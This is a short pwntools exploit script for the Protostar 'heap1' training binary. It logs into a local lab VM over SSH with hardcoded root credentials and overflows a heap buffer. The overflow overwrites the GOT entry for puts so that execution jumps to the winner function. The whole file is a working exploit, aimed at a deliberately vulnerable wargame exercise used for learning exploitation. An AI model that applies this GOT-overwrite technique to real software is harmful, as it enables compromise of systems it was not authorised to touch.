from pwn import *

#change the host IP to your IP
sh = ssh(host='192.168.1.104', user='root',
                password='godmode', port=22)
cmd = sh.set_working_directory('/opt/protostar/bin')

e = ELF("./heap1")
puts_add = p32(e.got["puts"])
winner = pack(0x8048494)

print "puts: ", puts_add
arg1 = "A"*20
arg1 += puts_add

arg2 = winner
print sh.run(['./heap1', arg1, arg2]).recvall().strip()
